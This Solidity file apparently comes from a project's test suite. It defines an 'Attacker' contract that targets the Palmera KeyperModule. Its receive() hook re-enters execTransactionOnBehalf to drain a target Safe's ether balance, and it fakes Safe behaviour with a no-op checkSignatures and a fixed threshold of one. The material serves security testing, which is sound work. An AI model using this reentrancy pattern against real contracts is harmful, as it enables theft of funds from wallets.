// SPDX-License-Identifier: LGPL-3.0-only
pragma solidity ^0.8.15;

import {KeyperModule} from "../src/KeyperModule.sol";
import {Enum} from "@safe-contracts/common/Enum.sol";
import {Errors} from "../libraries/Errors.sol";
import {DataTypes} from "../libraries/DataTypes.sol";
import {Constants} from "../libraries/Constants.sol";

/// @title Attacker
/// @custom:security-contact general@palmeradao.xyz
contract Attacker {
    bytes32 public orgFromAttacker;
    address public superSafeFromAttacker;
    address public targetSafeFromAttacker;
    bytes public dataFromAttacker;
    bytes public signaturesFromAttacker;

    address[] public owners = new address[](2);

    KeyperModule public keyperModule;

    constructor(address _contractToAttackAddress) {
        keyperModule = KeyperModule(_contractToAttackAddress);
    }

    //this is called when Attackee sends Ether to this contract (Attacker)
    receive() external payable {
        if (address(targetSafeFromAttacker).balance > 0 gwei) {
            keyperModule.execTransactionOnBehalf(
                orgFromAttacker,
                superSafeFromAttacker,
                targetSafeFromAttacker,
                address(this),
                address(targetSafeFromAttacker).balance,
                dataFromAttacker,
                Enum.Operation(0),
                signaturesFromAttacker
            );
        }
    }

    /// Function to perform the attack on the target contract, through the execTransactionOnBehalf
    /// @param org ID's Organization
    /// @param superSafe Safe super address
    /// @param targetSafe Safe target address
    /// @param to Address to which the transaction is being sent
    /// @param value Value (ETH) that is being sent with the transaction
    /// @param data Data payload of the transaction
    /// @param operation kind of operation (call or delegatecall)
    /// @param signatures Packed signatures data (v, r, s)
    /// @return result true if transaction was successful.
    function performAttack(
        bytes32 org,
        address superSafe,
        address targetSafe,
        address to,
        uint256 value,
        bytes calldata data,
        Enum.Operation operation,
        bytes memory signatures
    ) external returns (bool result) {
        setParamsForAttack(org, superSafe, targetSafe, data, signatures);
        result = keyperModule.execTransactionOnBehalf(
            org, superSafe, targetSafe, to, value, data, operation, signatures
        );
        return true;
    }

    /// function to set the owners of the Safe Multisig Wallet
    /// @param _owners Array of owners of the Safe Multisig Wallet
    function setOwners(address[] memory _owners) public {
        for (uint256 i = 0; i < owners.length; ++i) {
            owners[i] = _owners[i];
        }
    }

    /// function to get the balance of the Safe Multisig Wallet
    /// @param _safe Address of the Safe Multisig Wallet
    function getBalanceFromSafe(address _safe)
        external
        view
        returns (uint256)
    {
        return address(_safe).balance;
    }

    /// function to get the balance of the attacker contract
    /// @return balance of the attacker contract
    function getBalanceFromAttacker() external view returns (uint256) {
        return address(this).balance;
    }

    /// function to get the balance of the attacker contract
    /// @param dataHash Hash of the transaction data to sign
    /// @param data Data payload of the transaction
    /// @param signatures Packed signatures data (v, r, s)
    function checkSignatures(
        bytes32 dataHash,
        bytes memory data,
        bytes memory signatures
    ) external view {}

    /// function to get the owners of the Safe Multisig Wallet
    /// @return Array of owners of the Safe Multisig Wallet
    function getOwners() public view returns (address[] memory) {
        return owners;
    }

    /// function to get the threshold of the Safe Multisig Wallet
    /// @return threshold of the Safe Multisig Wallet
    function getThreshold() public pure returns (uint256) {
        return uint256(1);
    }

    /// function to set the parameters for the attack
    /// @param _org ID's Organization
    /// @param _superSafe Safe super address
    /// @param _targetSafe Safe target address
    /// @param _data Data payload of the transaction
    /// @param _signatures Packed signatures data (v, r, s)
    function setParamsForAttack(
        bytes32 _org,
        address _superSafe,
        address _targetSafe,
        bytes calldata _data,
        bytes memory _signatures
    ) internal {
        orgFromAttacker = _org;
        superSafeFromAttacker = _superSafe;
        targetSafeFromAttacker = _targetSafe;
        dataFromAttacker = _data;
        signaturesFromAttacker = _signatures;
    }
}
